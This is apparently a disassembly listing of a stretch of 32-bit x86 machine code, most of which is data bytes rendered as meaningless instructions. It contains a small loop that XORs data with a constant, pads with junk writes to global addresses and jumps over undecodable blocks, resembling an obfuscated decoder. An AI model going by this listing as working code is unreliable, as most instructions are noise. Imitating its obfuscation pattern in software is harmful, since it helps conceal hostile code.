  40489e:	fisubr WORD PTR [esi-0x5a]
  4048a1:	call   0x6cd9d9d5
  4048a6:	and    al,0xa2
  4048a8:	sar    cl,1
  4048aa:	mov    eax,0x72133f49
  4048af:	retf   
  4048b0:	adc    bl,bl
  4048b2:	cmp    BYTE PTR [bp+si],0xc1
  4048b6:	adc    al,BYTE PTR [ecx-0x38]
  4048b9:	aaa    
  4048ba:	stc    
  4048bb:	adc    ah,0x9d
  4048be:	shl    DWORD PTR [eax+ebx*1+0x4b4a8f80],1
  4048c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048c6:	int3   
  4048c7:	sbb    al,0x71
  4048c9:	imul   ebp,DWORD PTR [edi+0x46],0x4c5a4617
  4048d0:	and    al,0xc8
  4048d2:	psubusw mm4,QWORD PTR [esi+0x3f248af3]
  4048d9:	or     bh,BYTE PTR [ebx]
  4048db:	sub    eax,0x79bf4709
  4048e0:	and    ecx,DWORD PTR [esi+0x2885cbc0]
  4048e6:	shr    DWORD PTR [ecx+0x76],0xbc
  4048ea:	daa    
  4048eb:	lea    ecx,[eax+0x2c]
  4048ee:	hlt    
  4048ef:	jmp    0xde79868c
  4048f4:	push   0x6b
  4048f6:	call   0xbc55:0x73b74c49
  4048fd:	test   BYTE PTR [edi-0x53],dl
  404900:	call   0x53c3:0xaafe8472
  404907:	iret   
  404908:	imul   ebx,DWORD PTR [ebx-0x4d],0xffffff85
  40490c:	gs ds push esi
  40490f:	and    bl,BYTE PTR [ecx-0x2f]
  404912:	in     eax,dx
  404913:	aad    0xfd
  404915:	jmp    0x3d1:0x33f4458b
  40491c:	(bad)  
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e21c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e224,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e7ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e234,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fe05,0x42e234
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fe7a,0x42fdf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fe7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e803,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe82,0x42fe7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e807,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	xchg   esi,eax
  4049bc:	test   eax,0x21c9ae58
  4049c1:	jo     0x404a33
  4049c3:	cmp    eax,0x8070707d
  4049c8:	test   eax,0x4b002059
  4049cd:	and    DWORD PTR [edi+0x44],ebx
  4049d0:	adc    DWORD PTR [ecx+0x1f],0xffffffa1
  4049d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d5:	shr    DWORD PTR [ebp+ebx*4+0x3b],cl
  4049d9:	sub    BYTE PTR [eax],bl
  4049db:	in     eax,dx
  4049dc:	into   
  4049dd:	sahf   
  4049de:	in     al,0xee
  4049e0:	jp     0x4049c4
  4049e2:	inc    edx
  4049e3:	test   DWORD PTR [esi+esi*8+0x27318b8d],esp
  4049ea:	jo     0x404a3c
  4049ec:	loope  0x404a46
  4049ee:	cmp    eax,0xb45430e1
  4049f3:	lea    edi,[edx+0x15]
  4049f6:	in     eax,dx
  4049f7:	loopne 0x4049ba
  4049f9:	xchg   edx,eax
  4049fa:	rcr    al,1
  4049fc:	mov    ecx,0xccb93291
  404a01:	push   cs
  404a02:	arpl   bx,bp
  404a04:	jmp    0xfd3c68ce
  404a09:	dec    eax
  404a0a:	cmp    eax,0x5905f501
  404a0f:	and    bh,BYTE PTR [edx+0x1aed2de5]
  404a15:	rcr    DWORD PTR [edi+0x45],0x3d
  404a19:	mov    ds:0x36cb1d73,eax
  404a1e:	das    
  404a1f:	in     al,0x3e
  404a21:	push   0xfea64ea
  404a26:	(bad)  
  404a28:	or     ch,BYTE PTR [ebp-0x583b35f3]
  404a2e:	pop    esi
  404a2f:	xchg   ecx,eax
  404a30:	scas   eax,DWORD PTR es:[edi]
  404a31:	or     ecx,eax
  404a33:	pushf  
  404a34:	ja     0x404aae
  404a36:	js     0x404a3f
  404a38:	int    0x65
  404a3a:	xchg   ebx,eax
  404a3b:	mov    bl,0x61
  404a3d:	scas   al,BYTE PTR es:[edi]
  404a3e:	(bad)  
  404a3f:	fild   WORD PTR [edx+edi*8+0x398cffd1]
  404a46:	imul   ecx,DWORD PTR [edi],0xbf646eae
  404a4c:	stos   BYTE PTR es:[edi],al
  404a4d:	xor    DWORD PTR ds:0x15e20214,0xadcd7061
  404a57:	cmp    al,al
  404a59:	in     eax,dx
  404a5a:	dec    esi
  404a5b:	pop    esp
  404a5c:	ds inc ch
  404a5f:	pop    edi
  404a60:	xor    ecx,esp
  404a62:	cld    
  404a63:	(bad)  
  404a65:	pop    esi
  404a66:	sub    al,0xac
  404a68:	push   eax
  404a69:	add    DWORD PTR [ebp+0x2c],esp
  404a6c:	shl    BYTE PTR [ecx-0x43],1
  404a6f:	mov    WORD PTR [edi+0x62],ss
  404a72:	es jnp 0x404a84
  404a75:	leave  
  404a76:	or     DWORD PTR [edx-0x7d3327d],edi
  404a7c:	cmc    
  404a7d:	fwait
  404a7e:	shl    BYTE PTR [esi+0x182b1d9a],0xf6
  404a85:	cmp    BYTE PTR [edi+0x6],0xf4
  404a89:	retw   0x63c5
  404a8d:	xor    BYTE PTR [esi],bl
  404a8f:	or     ecx,0x4d
  404a92:	inc    edx
  404a93:	mov    ?,WORD PTR [edi+0x12]
  404a96:	ins    BYTE PTR es:[edi],dx
  404a97:	dec    DWORD PTR [ecx-0x7d]
  404a9a:	dec    ebp
  404a9b:	nop
  404a9c:	clc    
  404a9d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a9f:	mov    WORD PTR [ebx],ds
  404aa1:	jp     0x404ae0
  404aa3:	loop   0x404acc
  404aa5:	test   eax,0x24ce3204
  404aaa:	loopne 0x404a6f
  404aac:	aaa    
  404aad:	jecxz  0x404a7b
  404aaf:	stos   BYTE PTR es:[edi],al
  404ab0:	pushf  
  404ab1:	jmp    0x55dd7cd7
  404ab6:	jo     0x404a78
  404ab8:	clc    
  404ab9:	pop    esi
  404aba:	(bad)  
  404abb:	ficom  DWORD PTR ds:0xc2ec35de
  404ac1:	inc    ecx
  404ac2:	fmul   st(4),st
  404ac4:	int3   
  404ac5:	xchg   esp,eax
  404ac6:	mov    eax,ds:0x4a881581
  404acb:	lahf   
  404acc:	aaa    
  404acd:	cmp    ebx,ebp
  404acf:	ret    
  404ad0:	dec    ebx
  404ad1:	cli    
  404ad2:	clc    
  404ad3:	fnstenv [ebp+0x4f]
  404ad6:	and    al,0xcc
  404ad8:	and    eax,DWORD PTR [esi+0x1c00dadc]
  404ade:	cmp    eax,0x204a0506
  404ae3:	push   ss
  404ae4:	sub    ch,BYTE PTR [esi-0x7eabcba6]
  404aea:	mov    esi,0xb4e23b17
  404aef:	loop   0x404ab4
  404af1:	sub    bh,BYTE PTR [esi]
  404af3:	loopne 0x404abe
  404af5:	sbb    al,BYTE PTR [eax]
  404af7:	scas   eax,DWORD PTR es:[edi]
  404af8:	sub    DWORD PTR [eax],edx
  404afa:	ins    DWORD PTR es:[edi],dx
  404afb:	inc    edx
  404afc:	jnp    0x404a86
  404afe:	mov    edi,0xb58d3536
  404b03:	(bad)  
  404b04:	sbb    al,0x65
  404b06:	or     al,0xd6
  404b08:	and    DWORD PTR [edi],esp
  404b0a:	loopne 0x404af5
  404b0c:	inc    ecx
  404b0d:	xchg   ecx,eax
  404b0e:	rcr    DWORD PTR [ebx-0x5742dc34],cl
  404b14:	adc    BYTE PTR [edx+0x1f],bl
  404b17:	mov    dh,bh
  404b19:	fndisi(8087 only) 
  404b1b:	ds push ecx
  404b1d:	sti    
  404b1e:	out    dx,eax
  404b1f:	adc    bl,BYTE PTR [edx-0x76]
  404b22:	pop    ecx
  404b23:	(bad)  
  404b24:	fcomp  QWORD PTR [ebx+ebx*2-0x3cf11c53]
  404b2b:	cmp    DWORD PTR [ebx-0x612fd1b2],eax
  404b31:	xchg   ebx,eax
  404b32:	pop    ds
  404b33:	mov    DWORD PTR [esi+0x62],esp
  404b36:	mov    ds:0x608aab36,al
  404b3b:	iret   
  404b3c:	(bad)  
  404b3d:	jg     0x404b10
  404b3f:	popa   
  404b40:	xchg   edx,eax
  404b41:	push   cs
  404b42:	cdq    
  404b43:	push   0xffffff8d
  404b45:	adc    ah,BYTE PTR [edi-0x6fcc183b]
  404b4b:	ds xchg edi,eax
  404b4d:	inc    ebp
  404b4e:	(bad)  
  404b4f:	or     bh,BYTE PTR [edi-0x1fb9df2b]
  404b55:	push   es
  404b56:	lahf   
  404b57:	mov    eax,ds:0xc2350dc9
  404b5c:	mov    esi,0x87021f67
  404b61:	ror    BYTE PTR [ebx],0x98
  404b64:	dec    esp
  404b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b66:	adc    BYTE PTR [edi+0x25],bh
  404b69:	mov    ah,0x1a
  404b6b:	addr16 sbb ecx,ebx
  404b6e:	fdivr  st(3),st
  404b70:	(bad)  
  404b71:	stc    
  404b72:	jae    0x404b03
  404b74:	shl    edi,cl
  404b76:	pop    esp
  404b77:	hlt    
  404b78:	leave  
  404b79:	out    dx,eax
  404b7a:	jmp    0x404b6a
  404b7c:	popa   
  404b7d:	enter  0xccbb,0xd8
  404b81:	and    al,ch
  404b83:	rol    DWORD PTR [esi],0x23
  404b86:	mov    dh,0xbc
  404b88:	clc    
  404b89:	jmp    0x189bbe5a
  404b8e:	lods   al,BYTE PTR ds:[esi]
  404b8f:	jp     0x404b21
  404b91:	arpl   WORD PTR [edi+0x12bb8b],dx
  404b97:	mov    ecx,0x1438ecc1
  404b9c:	ds jns 0x404b37
  404b9f:	push   cs
  404ba0:	fst    DWORD PTR [eax+ebx*4-0xb]
  404ba4:	ss cmp eax,0x683668a5
  404baa:	pop    ds
  404bab:	arpl   WORD PTR [eax-0x3d0c6a8e],cx
  404bb1:	cwde   
  404bb2:	inc    ebp
  404bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb4:	push   ebp
  404bb5:	bound  ecx,QWORD PTR [ebp-0x14]
  404bb8:	jg     0x404bc7
  404bba:	jmp    0x404bc7
  404bbc:	pop    esi
  404bbd:	and    DWORD PTR [edi-0x27a3711],eax
  404bc3:	dec    DWORD PTR [ebp-0x4c]
  404bc6:	fiadd  DWORD PTR [ecx-0x5999cd70]
  404bcc:	mov    ebp,0x706bfbcf
  404bd1:	adc    al,0x21
  404bd3:	jmp    0x71ce:0xa0518b1c
  404bda:	fadd   DWORD PTR [ebx+0x2be81ef2]
  404be0:	mov    al,0x74
  404be2:	dec    eax
  404be3:	(bad)
  404be7:	and    eax,DWORD PTR [ebx-0x3fc153ac]
  404bed:	xor    edx,DWORD PTR [ecx+0x7]
  404bf0:	out    dx,al
  404bf1:	out    dx,al
  404bf2:	shr    ebx,1
  404bf4:	mov    edi,0xde800f2d
  404bf9:	enter  0xf9e5,0x69
  404bfd:	mov    esi,0xf58cd4a4
  404c02:	call   0xafaa:0x3d39427e
  404c09:	cmp    eax,0xda64445d
  404c0e:	xor    bl,ch
  404c10:	loop   0x404bec
  404c12:	adc    eax,0xd5002aad
  404c17:	jmp    0x404be4
  404c19:	jo     0x404c70
  404c1b:	inc    ebp
  404c1c:	inc    ebp
  404c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c1e:	adc    al,0x56
  404c20:	pop    ebp
  404c21:	(bad)  
  404c22:	shl    BYTE PTR [ebp-0x526150e5],1
  404c28:	aaa    
  404c29:	enter  0x6c60,0xbb
  404c2d:	lods   eax,DWORD PTR ds:[esi]
  404c2e:	dec    edi
  404c2f:	cmc    
  404c30:	push   0x6a954553
  404c35:	(bad)  
  404c36:	ja     0x404bd8
  404c38:	xor    esp,DWORD PTR [edi-0x4cf0ec6e]
  404c3e:	add    BYTE PTR [ecx],al
  404c40:	jo     0x404c99
  404c42:	int3   
  404c43:	retf   
  404c44:	sub    al,bl
  404c46:	mov    al,0x34
  404c48:	int3   
  404c49:	outs   dx,DWORD PTR ds:[esi]
  404c4a:	scas   al,BYTE PTR es:[edi]
  404c4b:	mov    bl,0x89
  404c4d:	dec    ebp
  404c4e:	and    BYTE PTR [edi+0x36f28c86],bh
  404c54:	sub    eax,DWORD PTR [ecx]
  404c56:	xchg   esp,eax
  404c57:	dec    eax
  404c58:	inc    edx
  404c59:	in     eax,0x5c
  404c5b:	or     eax,DWORD PTR [eax+ebp*4]
  404c5e:	mov    bl,0x9e
  404c60:	outs   dx,DWORD PTR ds:[esi]
  404c61:	mov    bl,0x64
  404c63:	(bad)
  404c66:	add    ah,BYTE PTR [esi]
  404c68:	inc    ebx
  404c69:	push   0xffffffc5
  404c6b:	popa   
  404c6c:	aad    0x6d
  404c6e:	sbb    al,BYTE PTR [ecx+0x32]
  404c71:	or     DWORD PTR [edi+0x66],edx
  404c74:	mov    ds:0x5f234469,eax
  404c79:	cmp    BYTE PTR [edi],bl
  404c7b:	cdq    
  404c7c:	jnp    0x404c58
  404c7e:	mov    esi,0x2aaac809
  404c83:	call   0x4fa7:0xacbd26a9
  404c8a:	daa    
  404c8b:	and    al,0x48
  404c8d:	and    DWORD PTR [edx+0x44],ebx
  404c90:	ds or  eax,0x695f27f5
  404c96:	mov    ecx,DWORD PTR [edi+0x4c38fbdb]
  404c9c:	pusha  
  404c9d:	jnp    0x404cf9
  404c9f:	xchg   edx,eax
  404ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ca1:	push   edx
  404ca2:	mov    bh,0x6e
  404ca4:	mov    dl,0x99
  404ca6:	test   al,0xa2
  404ca8:	xchg   ebp,eax
  404ca9:	rol    dl,1
  404cab:	scas   eax,DWORD PTR es:[edi]
  404cac:	sub    ch,BYTE PTR [eax]
  404cae:	mov    ebp,0xff4cdbc2
  404cb3:	push   0xde079724
  404cb8:	ss shl dh,0x13
  404cbc:	sbb    edi,DWORD PTR [edx]
  404cbe:	push   ebp
  404cbf:	arpl   WORD PTR [edx-0x65],cx
  404cc2:	fadd   st(6),st
  404cc4:	in     al,0x87
  404cc6:	mov    esi,0xd14b1478
  404ccb:	nop
  404ccc:	pop    ds
  404ccd:	fsubr  QWORD PTR [ecx+ebx*4+0x6b]
  404cd1:	(bad)  
  404cd2:	in     al,0x50
  404cd4:	sbb    dh,BYTE PTR [edx+0x36508e5d]
  404cda:	out    dx,al
  404cdb:	outs   dx,DWORD PTR ds:[esi]
  404cdc:	xchg   bx,ax
  404cde:	lea    ecx,[ecx]
  404ce0:	ret    
  404ce1:	sbb    DWORD PTR [ecx+0x42],0xe
  404ce5:	stos   DWORD PTR es:[edi],eax
  404ce6:	mov    ebx,0x7297216f
  404ceb:	(bad)  
  404cec:	xchg   edx,eax
  404ced:	outs   dx,DWORD PTR ds:[esi]
  404cee:	push   esp
  404cef:	enter  0xf2c,0x43
  404cf3:	retf   0xcfd0
  404cf6:	sub    BYTE PTR ds:0xcb453c4b,bl
  404cfc:	add    BYTE PTR ss:[esi+0x40c5013e],al
  404d03:	mov    dh,0xc5
  404d05:	mov    bh,0xd3
  404d07:	loope  0x404c8a
  404d09:	xchg   BYTE PTR [ebx],al
  404d0b:	mov    edi,0x42e7ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e7eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x18]
  404d39:	clc    
  404d3a:	and    al,0x4d
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0x8b70707d
  404d45:	stos   BYTE PTR es:[edi],al
  404d46:	or     DWORD PTR [esi+0x8ff9d9a],edi
  404d4c:	and    BYTE PTR [ecx+0x18f57544],bh
  404d52:	push   esi
  404d53:	stc    
  404d54:	jnp    0x404d0c
  404d56:	div    BYTE PTR fs:[eax-0x769bf2ee]
  404d5d:	ins    BYTE PTR es:[edi],dx
  404d5e:	sub    DWORD PTR [eax],esi
  404d60:	in     al,0x22
  404d62:	mov    bh,0x7d
  404d64:	cmp    ch,BYTE PTR [edx+0x10575279]
  404d6a:	lahf   
  404d6b:	inc    ecx
  404d6c:	adc    al,0x47
  404d6e:	add    ch,bh
  404d70:	push   edi
  404d71:	gs jbe 0x404dd0
  404d74:	jns    0x404dca
  404d76:	sbb    esi,esp
  404d78:	adc    edi,DWORD PTR [edi]
  404d7a:	xor    bl,al
  404d7c:	aad    0x32
  404d7e:	cmc    
  404d7f:	jg     0x404db2
  404d81:	ins    BYTE PTR es:[edi],dx
  404d82:	(bad)  
  404d83:	jne    0x404d90
  404d85:	jns    0x404dec
  404d87:	cmp    ch,BYTE PTR [ecx-0x7ede8c37]
  404d8d:	mov    al,ds:0xbde9ad91
  404d92:	shr    DWORD PTR [ecx-0x56],cl
  404d95:	inc    esi
  404d96:	call   0xa3b9:0xccb68ff9
  404d9d:	and    dh,BYTE PTR [ecx+0x79]
  404da0:	daa    
  404da1:	mov    ch,0xdc
  404da3:	push   0x33
  404da5:	mov    edx,0x6249445
  404daa:	or     BYTE PTR [esi],dh
  404dac:	push   ds
  404dad:	pop    es
  404dae:	pop    esp
  404daf:	pop    edx
  404db0:	sub    BYTE PTR [esi+0x40],dl
  404db3:	cmc    
  404db4:	stc    
  404db5:	call   0xa05877e3
  404dba:	pop    DWORD PTR [ecx-0x45]
  404dbd:	std    
  404dbe:	fiadd  DWORD PTR [edx-0x18d6ac85]
  404dc4:	xchg   ebx,eax
  404dc5:	pop    eax
  404dc6:	dec    ebp
  404dc7:	cwde   
  404dc8:	cli    
  404dc9:	push   edx
  404dca:	bound  ebp,QWORD PTR [edx]
  404dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dcd:	les    edx,FWORD PTR [ebx-0x79]
  404dd0:	scas   al,BYTE PTR es:[edi]
  404dd1:	call   0x117a:0xe767871a
  404dd8:	dec    ebx
  404dd9:	(bad)  
  404dda:	inc    BYTE PTR [ebp+0x57a32f55]
  404de0:	lods   eax,DWORD PTR ds:[esi]
  404de1:	sbb    eax,0x861aa04a
  404de6:	stos   BYTE PTR es:[edi],al
  404de7:	cld    
  404de8:	cmp    DWORD PTR [edx],eax
  404dea:	adc    bl,bl
  404dec:	mov    eax,ds:0x9aa9fc5d
  404df1:	cwde   
  404df2:	mov    edi,0xee79462d
  404df7:	jle    0x404dec
  404df9:	div    BYTE PTR [eax]
  404dfb:	jno    0x404e04
  404dfd:	adc    eax,0x171d489d
  404e02:	sbb    BYTE PTR [esi-0x49cadc4b],0xf
  404e09:	adc    DWORD PTR [ecx],ebx
  404e0b:	fdiv   QWORD PTR [edi-0x4c00d074]
  404e11:	pop    es
  404e12:	mov    BYTE PTR [eax],bl
  404e14:	add    eax,0x27df8b5
  404e19:	int    0x6d
  404e1b:	jg     0x404e5b
  404e1d:	sub    eax,0xd58a7f46
  404e22:	gs int 0xe2
  404e25:	dec    ebx
  404e26:	loop   0x404df4
  404e28:	rol    BYTE PTR [edi-0x5ec507da],0xc1
  404e2f:	push   cs
  404e30:	cdq    
  404e31:	sbb    esi,DWORD PTR [edi+eax*8+0x24]
  404e35:	out    0x87,eax
  404e37:	mov    ds:0x648707ce,eax
  404e3c:	out    dx,al
  404e3d:	mov    bh,0x75
  404e3f:	daa    
  404e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e41:	fistp  DWORD PTR [ebx+0x3d]
  404e44:	xchg   ecx,eax
  404e45:	cwde   
  404e46:	in     al,dx
  404e47:	or     bl,BYTE PTR [eax-0x7c]
  404e4a:	shl    bl,cl
  404e4c:	push   esi
  404e4d:	ins    BYTE PTR es:[edi],dx
  404e4e:	mov    ds:0x19827e30,eax
  404e53:	mov    ecx,0x546297f8
  404e58:	iret   
  404e59:	pop    eax
  404e5a:	shl    BYTE PTR [esi+eiz*1],cl
  404e5d:	enter  0x3519,0x95
  404e61:	out    dx,eax
  404e62:	ins    DWORD PTR es:[edi],dx
  404e63:	jne    0x404ebf
  404e65:	(bad)  
  404e66:	out    0xd,eax
  404e68:	push   0x5db5ea4a
  404e6d:	and    al,0x57
  404e6f:	in     al,0x45
  404e71:	dec    ebx
  404e72:	or     al,BYTE PTR [eax]
  404e74:	loop   0x404ee1
  404e76:	push   ebp
  404e77:	pop    ebx
  404e78:	add    BYTE PTR [esi-0x3c],cl
  404e7b:	dec    esp
  404e7c:	pop    ebx
  404e7d:	pop    es
  404e7e:	sub    al,0xae
  404e80:	push   esp
  404e81:	lods   eax,DWORD PTR ds:[esi]
  404e82:	pushfw 
  404e84:	mov    ah,0x7e
  404e86:	bound  ebp,QWORD PTR [ecx+edx*4+0x1f]
  404e8a:	adc    al,0xb5
  404e8c:	jecxz  0x404f0d
  404e8e:	mov    ebx,0xe2b3248e
  404e93:	xchg   ebx,eax
  404e94:	inc    ecx
  404e95:	nop
  404e96:	dec    eax
  404e97:	xchg   edx,eax
  404e98:	ror    DWORD PTR [esi+ebx*2-0x2211409c],0x52
  404ea0:	test   ah,cl
  404ea2:	sub    DWORD PTR [esi],0xffffffda
  404ea5:	inc    ecx
  404ea6:	or     DWORD PTR [esi+0x13c3a6c5],ebp
  404eac:	push   esp
  404ead:	sbb    al,0x1c
  404eaf:	cld    
  404eb0:	jo     0x404e5b
  404eb2:	popf   
  404eb3:	adc    DWORD PTR [edi+0x28eea4a2],eax
  404eb9:	mov    BYTE PTR [esi],bh
  404ebb:	sbb    DWORD PTR [ebp+0x1c66e65f],edx
  404ec1:	push   cs
  404ec2:	icebp  
  404ec3:	js     0x404e8d
  404ec5:	int    0xc9
  404ec7:	sub    eax,0x5e8f4c82
  404ecc:	sahf   
  404ecd:	lods   al,BYTE PTR ds:[esi]
  404ece:	imul   BYTE PTR [ebx-0x77]
  404ed1:	mov    cl,0x38
  404ed3:	adc    edx,DWORD PTR [edx-0x10]
  404ed6:	add    al,0xaf
  404ed8:	sbb    ebx,DWORD PTR [edi]
  404eda:	aam    0x42
  404edc:	add    eax,0x3477b38c
  404ee1:	test   al,0x7c
  404ee3:	push   ecx
  404ee4:	shr    DWORD PTR [esi],cl
  404ee6:	enter  0x1bd6,0x74
  404eea:	xchg   ecx,eax
  404eeb:	enter  0x104b,0x43
  404eef:	mov    al,0x13
  404ef1:	cwde   
  404ef2:	retf   0xafc9
  404ef5:	out    0xc3,eax
  404ef7:	push   ebx
  404ef8:	push   edi
  404ef9:	(bad)  
  404efa:	(bad)  
  404efb:	inc    ecx
  404efc:	xor    bh,bl
  404efe:	shr    DWORD PTR [edx],1
  404f00:	clts   
  404f02:	clc    
  404f03:	inc    edx
  404f04:	mov    al,0xc1
  404f06:	and    BYTE PTR [edi],bl
  404f08:	jg     0x404ed5
  404f0a:	inc    esp
  404f0b:	adc    BYTE PTR [ebx+edi*4-0x1e],al
  404f0f:	retf   0xb816
  404f12:	jnp    0x404f93
  404f14:	fld    QWORD PTR [ebx-0x13]
  404f17:	ret    0x8ea1
  404f1a:	cmp    DWORD PTR [edx+0x67],eax
  404f1d:	sti    
  404f1e:	mov    eax,0x2cefd2fe
  404f23:	lahf   
  404f24:	pop    esi
  404f25:	in     eax,0x55
  404f27:	push   esi
  404f28:	inc    ecx
  404f29:	jnp    0x404eee
  404f2b:	inc    ebp
  404f2c:	dec    DWORD PTR [edx-0x56d559cd]
  404f32:	arpl   WORD PTR [edi-0xa],si
  404f35:	stos   DWORD PTR es:[edi],eax
  404f36:	adc    eax,0x7f1a8189
  404f3b:	pop    ebp
  404f3c:	dec    eax
  404f3d:	imul   ecx,DWORD PTR [edx-0x5b],0xffffffc9
  404f41:	mov    ebx,0xd53874eb
  404f46:	jmp    0xe1dd12b8
  404f4b:	retf   0x9a47
  404f4e:	scas   al,BYTE PTR es:[edi]
  404f4f:	mov    ds:0x4a3194c0,eax
  404f54:	jge    0x404f30
  404f56:	mov    al,0x1d
  404f58:	cmp    al,BYTE PTR [eax]
  404f5a:	sub    al,0x3e
  404f5c:	call   0x5c3e2ebc
  404f61:	loop   0x404fb4
  404f63:	fcom   DWORD PTR [esi-0x36a3c3e0]
  404f69:	and    al,0x75
  404f6b:	jmp    0xcd4a1287
  404f70:	ror    edx,0x66
  404f73:	xor    eax,0x7c309183
  404f78:	xor    al,0x22
  404f7a:	inc    ecx
  404f7b:	call   0x468e:0xf22dd345
  404f82:	je     0x404f92
  404f84:	aam    0x1
  404f86:	jns    0x404f31
  404f88:	sub    DWORD PTR [esp+ecx*8+0x7e],edi
  404f8c:	mov    ss,WORD PTR [eax+eax*8+0x1]
  404f90:	inc    eax
  404f91:	mov    ebx,0x4c5baf85
  404f96:	in     eax,0x6a
  404f98:	xor    DWORD PTR [edi+0x1],eax
  404f9b:	push   cs
  404f9c:	les    edi,FWORD PTR [edi-0x77b38e8a]
  404fa2:	adc    al,0x64
  404fa4:	push   esi
  404fa5:	inc    esp
  404fa6:	popf   
  404fa7:	inc    esi
  404fa8:	loopne 0x404ff2
  404faa:	xor    DWORD PTR [ecx],ebx
  404fac:	jl     0x404f9c
  404fae:	sub    dl,0x9a
  404fb1:	mov    bh,0x42
  404fb3:	add    eax,0x52e5c5ac
  404fb8:	scas   eax,DWORD PTR es:[edi]
  404fb9:	or     al,0x55
  404fbb:	mov    cl,BYTE PTR [edx+0x24]
  404fbe:	adc    eax,0xde557b80
  404fc3:	xchg   ecx,eax
  404fc4:	addr16 jp 0x405042
  404fc7:	in     al,0x21
  404fc9:	sub    DWORD PTR [edx+0x41c84eb0],edx
  404fcf:	imul   edx,DWORD PTR [ecx+0x37],0x727a17c5
  404fd6:	mov    esp,0x3ee76e4c
  404fdb:	jmp    0x93f4:0x57757bdb
  404fe2:	mov    esp,0x6e2dbc42
  404fe7:	jb     0x404f73
  404fe9:	jnp    0x405017
  404feb:	fild   DWORD PTR [edx+0x1c]
  404fee:	cli    
  404fef:	push   ebx
  404ff0:	mov    WORD PTR [ebp+0x4c],es
  404ff3:	das    
  404ff4:	push   eax
  404ff5:	mov    BYTE PTR [eax+0x75],ah
  404ff8:	fisub  DWORD PTR [edx-0x4f82037f]
  404ffe:	stos   DWORD PTR es:[edi],eax
  404fff:	pop    esp
  405000:	mov    cl,0x59
  405002:	xor    al,BYTE PTR [eax]
  405004:	les    edi,FWORD PTR [ecx-0x22]
  405007:	add    DWORD PTR [edi-0x3987d440],0x51643296
  405011:	push   ebp
  405012:	pop    eax
  405013:	clc    
  405014:	pop    ebx
  405015:	stc    
  405016:	cmp    eax,0x9627e613
  40501b:	repnz fisub WORD PTR [edx-0x22cff713]
  405022:	push   eax
  405023:	inc    edx
  405024:	sub    BYTE PTR [ebx-0x59],bl
  405027:	mov    al,ds:0xbd99eab4
  40502c:	mov    cl,0x3c
  40502e:	jne    0x40500d
  405030:	mov    eax,ds:0x630fc910
  405035:	in     al,0x92
  405037:	das    
  405038:	mov    eax,ds:0xef2fe0a1
  40503d:	dec    ebx
  40503e:	ror    DWORD PTR [ecx],1
  405040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405041:	mov    ds:0x50d82508,eax
  405046:	sbb    eax,0x95268641
  40504b:	(bad)  
  40504d:	or     edi,DWORD PTR ds:[edx+0x6d5f4051]
  405054:	inc    ecx
  405055:	sbb    al,0x6f
  405057:	imul   BYTE PTR [eax+0x2cd4bf36]
  40505d:	fxch   st(4)
  40505f:	inc    edi
  405060:	sub    esi,DWORD PTR [edi]
  405062:	arpl   WORD PTR [edi],sp
  405064:	shl    DWORD PTR [ecx-0x3],0x7f
  405068:	push   ecx
  405069:	push   es
  40506a:	push   ebp
  40506b:	(bad)  
  40506c:	cwde   
  40506d:	sbb    BYTE PTR [eax+edi*8],cl
  405070:	(bad)  
  405071:	cmp    al,0x5d
  405073:	into   
  405074:	daa    
  405075:	ficomp WORD PTR [esi]
  405077:	pusha  
  405078:	add    BYTE PTR [edi-0x7b],0x2f
  40507c:	mov    ds:0x845b5671,al
  405081:	fisub  WORD PTR [eax-0x45]
  405084:	xor    DWORD PTR [edi],edi
  405086:	inc    edi
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
